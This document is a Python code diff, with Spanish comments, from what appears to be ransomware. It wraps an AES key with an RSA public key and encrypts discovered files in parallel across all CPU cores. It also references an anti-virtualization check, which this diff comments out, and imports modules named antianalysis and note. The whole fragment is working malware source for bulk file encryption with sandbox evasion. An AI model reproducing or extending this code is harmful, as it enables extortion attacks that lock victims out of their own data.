@@ -10,12 +10,12 @@ import agent
 import note
 
 def load_aes_key():
-    with open("aes_key.bin", "rb") as key_file:
-        return key_file.read()
+    with open("aes_key.bin", "rb") as f:
+        return f.read()
     
 def load_rsa_public_key():
     with open("rsa_public.pem", "rb") as f:
-        return  RSA.import_key(f.read())
+        return RSA.import_key(f.read())
     
 def encrypt_aes_key(rsa_public_key, aes_key):
     cipher_rsa = PKCS1_OAEP.new(rsa_public_key)
@@ -39,10 +39,10 @@ def encrypt_file(file, aes_key):
         print(f"Error cifrando {file}: {e}") 
 
 def encrypt_files():
-    antianalysis.check_virtualization() # Comprobación anti-virtualización
+    #antianalysis.check_virtualization() # Comprobación anti-virtualización
+    files = find_files()  # Obtener lista de archivos a cifrar
     gen_keys.generate_aes_key()  # Generar clave simétrica
     aes_key = load_aes_key()  # Cargar la clave simétrica
-    files = find_files()  # Obtener lista de archivos a cifrar
     with multiprocessing.Pool(processes=os.cpu_count()) as pool:
         # Usa un pool de procesos para cifrar los archivos en paralelo
         pool.starmap(encrypt_file, [(file, aes_key) for file in files]) 
